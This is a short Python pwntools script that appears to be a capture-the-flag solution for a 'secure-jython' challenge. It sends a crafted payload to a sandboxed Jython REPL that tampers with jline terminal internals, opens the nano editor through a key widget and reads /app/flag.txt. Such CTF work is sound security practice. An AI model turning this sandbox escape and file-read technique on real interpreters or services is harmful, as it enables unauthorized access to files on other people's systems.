#!/usr/bin/env python

from pwn import *

lines = """
import jython
import org

# Get jython.Repl.reader
reader = &1.value
reader.self = jython.Repl
reader.member = jython.Repl.reader

# Clear reader.terminal.type to bypass LineReaderImpl.isTerminalDumb()
typ = &1.value
typ.self = (*reader).terminal
typ.member = org.jline.terminal.impl.AbstractTerminal.type
*typ = ""

# Make nano happy
(*reader).terminal.size.rows = 24
(*reader).terminal.size.cols = 80

# Call the nano widget
(*reader).widgets["callback-init"] = (*reader).widgets["edit-and-execute-command"]
""".strip()

def main():
    if args.REMOTE:
        io = remote('secure-jython.chal.perfect.blue', 1337)
    else:
        io = process('./jython')
    io.sendline(lines)
    io.send(b'\x12/app/flag.txt\r')
    # io.interactive()
    flag = io.recvline_pred(lambda line: line.startswith(b'pbctf'))
    info("flag: %s", flag.decode())

if __name__ == '__main__':
    main()
